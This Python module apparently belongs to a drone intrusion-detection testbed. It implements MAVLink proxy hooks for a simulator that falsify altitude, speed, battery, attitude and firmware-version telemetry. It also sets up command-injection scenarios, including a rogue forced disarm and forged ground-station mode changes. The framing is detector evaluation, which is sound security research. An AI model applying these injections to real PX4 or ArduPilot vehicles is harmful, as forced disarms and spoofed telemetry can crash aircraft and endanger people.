"""Live SITL proxy attacks for telemetry manipulation, firmware identity, and
restricted-visibility command-injection scenarios (#24).

All downlink rewrite hooks are pure, socket-free ``FrameHook`` callables sharing
passive target learning, signed-frame skip accounting, MAVLink-2 CRC re-packing,
and ground-truth ``FrameLogWriter`` audit logging. Detectors/features/fusion
are never imported or read here.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Any

from pymavlink.dialects.v20 import common as mav2

from .attacks_live import (
    DEFAULT_WARMUP_S,
    CommandInjectionAttack,
    draw_command_injection_params,
)
from .groundtruth import FrameLogEntry, FrameLogWriter
from .hooks import FrameContext

SYS_STATUS_ID = 1
ATTITUDE_ID = 30
GLOBAL_POSITION_INT_ID = 33
VFR_HUD_ID = 74
AUTOPILOT_VERSION_ID = 148
HEARTBEAT_ID = 0
_V2_MAGIC = 0xFD
_MAV_AUTOPILOT_PX4 = mav2.MAV_AUTOPILOT_PX4


def _pack_v2(msg: Any, ctx: FrameContext) -> bytes:
    encoder = mav2.MAVLink(None, srcSystem=ctx.sysid, srcComponent=ctx.compid)
    encoder.seq = ctx.seq
    return bytes(msg.pack(encoder))


class _DownlinkRewriteBase:
    """Shared target learning, active-window gating, signed skip, and FrameLogWriter helper."""

    _target_msgids: frozenset[int] = frozenset()

    def __init__(
        self,
        *,
        onset_s: float,
        duration_s: float,
        target_sysid: int | None = None,
        target_compid: int | None = None,
        warmup_s: float = DEFAULT_WARMUP_S,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
    ) -> None:
        if (target_sysid is None) != (target_compid is None):
            raise ValueError("target_sysid and target_compid must both be set or both be None")
        self._onset_s = float(onset_s)
        self._duration_s = float(duration_s)
        self._target_sysid = target_sysid
        self._target_compid = target_compid
        self._warmup_s = float(warmup_s)
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._decoder = mav2.MAVLink(None)
        self._first_vehicle_recv_ns: int | None = None

        self.frames_seen = 0
        self.frames_modified = 0
        self.frames_skipped_signed = 0

    def _maybe_learn_target(self, ctx: FrameContext) -> None:
        if self._target_sysid is not None or ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() == "HEARTBEAT" and getattr(msg, "autopilot", None) in (
            _MAV_AUTOPILOT_PX4,
            mav2.MAV_AUTOPILOT_ARDUPILOTMEGA,
        ):
            self._target_sysid = ctx.sysid
            self._target_compid = ctx.compid

    def _rewrite(self, msg: Any, elapsed_since_onset: float) -> dict[str, int] | None:
        raise NotImplementedError

    def _log(
        self,
        ctx: FrameContext,
        *,
        action: str,
        field_deltas: dict[str, int],
        crc_recomputed: bool,
        modified_len: int,
    ) -> None:
        if self._frame_log is None:
            return
        self._frame_log.append(
            FrameLogEntry(
                seq_no=self.frames_seen,
                proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
                recv_ns=ctx.recv_ns,
                msgid=ctx.msgid,
                sysid=ctx.sysid,
                compid=ctx.compid,
                mavlink_seq=ctx.seq,
                action=action,
                field_deltas=field_deltas,
                crc_recomputed=crc_recomputed,
                original_len=len(ctx.raw),
                modified_len=modified_len,
            )
        )

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction != "down":
            return [ctx.raw]
        self._maybe_learn_target(ctx)
        if self._target_sysid is None:
            return [ctx.raw]
        is_target = ctx.sysid == self._target_sysid and ctx.compid == self._target_compid
        if is_target and self._first_vehicle_recv_ns is None:
            self._first_vehicle_recv_ns = ctx.recv_ns
        if not is_target or ctx.msgid not in self._target_msgids or self._first_vehicle_recv_ns is None:
            return [ctx.raw]

        elapsed_s = (ctx.recv_ns - self._first_vehicle_recv_ns) / 1e9
        if not (elapsed_s >= max(self._warmup_s, self._onset_s) and elapsed_s < self._onset_s + self._duration_s):
            return [ctx.raw]

        if ctx.signed:
            self.frames_skipped_signed += 1
            self._log(
                ctx, action="forwarded", field_deltas={}, crc_recomputed=False, modified_len=len(ctx.raw)
            )
            return [ctx.raw]
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return [ctx.raw]

        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
            deltas = self._rewrite(msg, elapsed_s - self._onset_s)
            if deltas is None:
                return [ctx.raw]
            new_raw = _pack_v2(msg, ctx)
        except Exception:
            return [ctx.raw]

        self.frames_modified += 1
        self._log(
            ctx, action="modified", field_deltas=deltas, crc_recomputed=True, modified_len=len(new_raw)
        )
        return [new_raw]


@dataclass(frozen=True)
class AltitudeBiasParams:
    onset_s: float = 20.0
    duration_s: float = 25.0
    bias_rate_ms: float = 1.5
    max_bias_m: float = 35.0


class AltitudeBiasAttack(_DownlinkRewriteBase):
    """Ramps ``GLOBAL_POSITION_INT.relative_alt`` / ``alt`` and ``VFR_HUD.alt`` on downlink."""

    _target_msgids = frozenset({GLOBAL_POSITION_INT_ID, VFR_HUD_ID})

    def __init__(self, params: AltitudeBiasParams | None = None, **kw: Any) -> None:
        self.params = params or AltitudeBiasParams()
        super().__init__(onset_s=self.params.onset_s, duration_s=self.params.duration_s, **kw)

    def _rewrite(self, msg: Any, elapsed_since_onset: float) -> dict[str, int] | None:
        offset_m = min(self.params.max_bias_m, self.params.bias_rate_ms * max(0.0, elapsed_since_onset))
        mtype = msg.get_type()
        if mtype == "GLOBAL_POSITION_INT":
            delta_mm = int(round(offset_m * 1000.0))
            msg.relative_alt += delta_mm
            msg.alt += delta_mm
            return {"relative_alt_mm": delta_mm, "alt_mm": delta_mm}
        if mtype == "VFR_HUD":
            msg.alt = float(msg.alt) + offset_m
            return {"vfr_alt_mm": int(round(offset_m * 1000.0))}
        return None


@dataclass(frozen=True)
class SpeedMismatchParams:
    onset_s: float = 20.0
    duration_s: float = 25.0
    scale_factor: float = 1.8


class SpeedMismatchAttack(_DownlinkRewriteBase):
    """Scales ``VFR_HUD.groundspeed`` / ``airspeed`` while leaving GPS velocity untouched."""

    _target_msgids = frozenset({VFR_HUD_ID})

    def __init__(self, params: SpeedMismatchParams | None = None, **kw: Any) -> None:
        self.params = params or SpeedMismatchParams()
        super().__init__(onset_s=self.params.onset_s, duration_s=self.params.duration_s, **kw)

    def _rewrite(self, msg: Any, _elapsed: float) -> dict[str, int] | None:
        if msg.get_type() != "VFR_HUD":
            return None
        old_gs = float(msg.groundspeed)
        new_gs = old_gs * self.params.scale_factor
        msg.groundspeed = new_gs
        msg.airspeed = float(msg.airspeed) * self.params.scale_factor
        return {"groundspeed_cms": int(round((new_gs - old_gs) * 100.0))}


@dataclass(frozen=True)
class BatteryJumpParams:
    onset_s: float = 20.0
    duration_s: float = 25.0
    delta_mv: int = 3500


class BatteryJumpAttack(_DownlinkRewriteBase):
    """Applies a step jump to ``SYS_STATUS.voltage_battery`` (mV)."""

    _target_msgids = frozenset({SYS_STATUS_ID})

    def __init__(self, params: BatteryJumpParams | None = None, **kw: Any) -> None:
        self.params = params or BatteryJumpParams()
        super().__init__(onset_s=self.params.onset_s, duration_s=self.params.duration_s, **kw)

    def _rewrite(self, msg: Any, _elapsed: float) -> dict[str, int] | None:
        if msg.get_type() != "SYS_STATUS":
            return None
        old_mv = int(msg.voltage_battery)
        new_mv = max(0, min(65535, old_mv + int(self.params.delta_mv)))
        msg.voltage_battery = new_mv
        return {"voltage_battery_mv": new_mv - old_mv}


@dataclass(frozen=True)
class FrozenAttitudeParams:
    onset_s: float = 20.0
    duration_s: float = 25.0


class FrozenAttitudeAttack(_DownlinkRewriteBase):
    """Repeats the first captured ``ATTITUDE`` angles/rates with fresh ``time_boot_ms``."""

    _target_msgids = frozenset({ATTITUDE_ID})

    def __init__(self, params: FrozenAttitudeParams | None = None, **kw: Any) -> None:
        self.params = params or FrozenAttitudeParams()
        super().__init__(onset_s=self.params.onset_s, duration_s=self.params.duration_s, **kw)
        self._frozen_vals: tuple[float, float, float, float, float, float] | None = None

    def _rewrite(self, msg: Any, _elapsed: float) -> dict[str, int] | None:
        if msg.get_type() != "ATTITUDE":
            return None
        cur = (
            float(msg.roll),
            float(msg.pitch),
            float(msg.yaw),
            float(msg.rollspeed),
            float(msg.pitchspeed),
            float(msg.yawspeed),
        )
        if self._frozen_vals is None:
            self._frozen_vals = cur
        msg.roll, msg.pitch, msg.yaw, msg.rollspeed, msg.pitchspeed, msg.yawspeed = self._frozen_vals
        return {
            "roll_mrad": int(round((self._frozen_vals[0] - cur[0]) * 1000.0)),
            "pitch_mrad": int(round((self._frozen_vals[1] - cur[1]) * 1000.0)),
        }


@dataclass(frozen=True)
class FirmwareIdentityParams:
    onset_s: float = 15.0
    duration_s: float = 40.0
    spoof_sw_version: int = 0xDEADBEEF
    spoof_custom_version: bytes = b"rogue-fw"


class FirmwareIdentityAttack(_DownlinkRewriteBase):
    """Rewrites ``AUTOPILOT_VERSION`` replies to exercise allowlist checks (#20)."""

    _target_msgids = frozenset({AUTOPILOT_VERSION_ID})

    def __init__(self, params: FirmwareIdentityParams | None = None, **kw: Any) -> None:
        self.params = params or FirmwareIdentityParams()
        super().__init__(onset_s=self.params.onset_s, duration_s=self.params.duration_s, **kw)

    def _rewrite(self, msg: Any, _elapsed: float) -> dict[str, int] | None:
        if msg.get_type() != "AUTOPILOT_VERSION":
            return None
        old_sw = int(msg.flight_sw_version)
        new_sw = int(self.params.spoof_sw_version) & 0xFFFFFFFF
        msg.flight_sw_version = new_sw
        custom = list(self.params.spoof_custom_version[:8].ljust(8, b"\x00"))
        msg.flight_custom_version = custom
        return {"flight_sw_version_delta": new_sw - old_sw}


class BenignPilotControlHook:
    """No-op restricted-visibility baseline hook with matching injection counters."""

    def __init__(self) -> None:
        self.frames_seen = 0
        self.frames_injected = 0
        self.frames_modified = 0
        self.frames_skipped_signed = 0
        self.acks_accepted = 0

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        return [ctx.raw]


def build_restricted_visibility_hook(
    scenario: str,
    *,
    seed: int = 1001,
    trial_index: int = 0,
    warmup_s: float = 0.0,
    target_sysid: int | None = None,
    target_compid: int | None = None,
    frame_log: FrameLogWriter | None = None,
) -> Any:
    """Build one of the four restricted-visibility command scenarios (#24):

    - ``rogue_force_disarm``: rogue sysid 66 injects force-disarm (armed on ground)
    - ``gcs_forgery_own_counter``: sysid 255/190 mode-change forgery using own counter
    - ``gcs_forgery_track_identity``: sysid 255/190 mode-change forgery tracking real seq
    - ``benign_pilot_control``: benign pass-through control baseline (0 injections)
    """
    params = draw_command_injection_params(seed, trial_index=trial_index)
    if scenario == "rogue_force_disarm":
        return CommandInjectionAttack(
            params,
            target_sysid=target_sysid,
            target_compid=target_compid,
            rogue_sysid=66,
            rogue_compid=200,
            command=400,
            command_params=(0.0, 21196.0, 0.0, 0.0, 0.0, 0.0, 0.0),
            warmup_s=warmup_s,
            frame_log=frame_log,
            seq_policy="own_counter",
        )
    if scenario == "gcs_forgery_own_counter":
        return CommandInjectionAttack(
            params,
            target_sysid=target_sysid,
            target_compid=target_compid,
            rogue_sysid=255,
            rogue_compid=190,
            command=176,
            command_params=(1.0, 6.0, 0.0, 0.0, 0.0, 0.0, 0.0),
            warmup_s=warmup_s,
            frame_log=frame_log,
            seq_policy="own_counter",
        )
    if scenario == "gcs_forgery_track_identity":
        return CommandInjectionAttack(
            params,
            target_sysid=target_sysid,
            target_compid=target_compid,
            rogue_sysid=255,
            rogue_compid=190,
            command=176,
            command_params=(1.0, 6.0, 0.0, 0.0, 0.0, 0.0, 0.0),
            warmup_s=warmup_s,
            frame_log=frame_log,
            seq_policy="track_identity",
        )
    if scenario == "benign_pilot_control":
        return BenignPilotControlHook()
    raise ValueError(f"unknown restricted-visibility scenario {scenario!r}")
